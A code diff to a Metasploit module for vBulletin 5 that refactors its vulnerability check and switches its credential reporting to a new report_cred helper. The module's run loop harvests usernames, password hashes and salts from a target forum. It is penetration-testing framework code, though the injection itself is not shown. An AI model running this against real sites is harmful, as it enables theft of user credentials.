@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -128,21 +128,48 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def check
-    node_id = get_node
-
-    unless node_id.nil?
-      return Msf::Exploit::CheckCode::Vulnerable
-    end
-
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, "index.php")
     })
 
     if res and res.code == 200 and res.body.to_s =~ /"simpleversion": "v=5/
-      return Msf::Exploit::CheckCode::Detected
+      if get_node
+        # Multiple factors determine this LOOKS vulnerable
+        return Msf::Exploit::CheckCode::Appears
+      else
+        # Not enough information about the vuln state, but at least we know this is vbulletin
+        return Msf::Exploit::CheckCode::Detected
+      end
     end
 
-    return Msf::Exploit::CheckCode::Unknown
+    Msf::Exploit::CheckCode::Safe
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :nonreplayable_hash,
+      jtr_format: 'md5'
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 
   def run
@@ -164,22 +191,21 @@ class Metasploit3 < Msf::Auxiliary
 
     users_table = Rex::Ui::Text::Table.new(
       'Header'  => 'vBulletin Users',
-      'Ident'   => 1,
+      'Indent'   => 1,
       'Columns' => ['Username', 'Password Hash', 'Salt']
     )
 
     for i in 0..count_users
       user = get_user_data(node_id, i)
       unless user.join.empty?
-        report_auth_info({
-         :host => rhost,
-         :port => rport,
-         :user => user[0],
-         :pass => user[1],
-         :type => "hash",
-         :sname => (ssl ? "https" : "http"),
-         :proof => "salt: #{user[2]}" # Using proof to store the hash salt
-        })
+        report_cred(
+          ip: rhost,
+          port: rport,
+          user: user[0],
+          password: user[1],
+          service_name: (ssl ? "https" : "http"),
+          proof: "salt: #{user[2]}"
+        )
         users_table << user
       end
     end
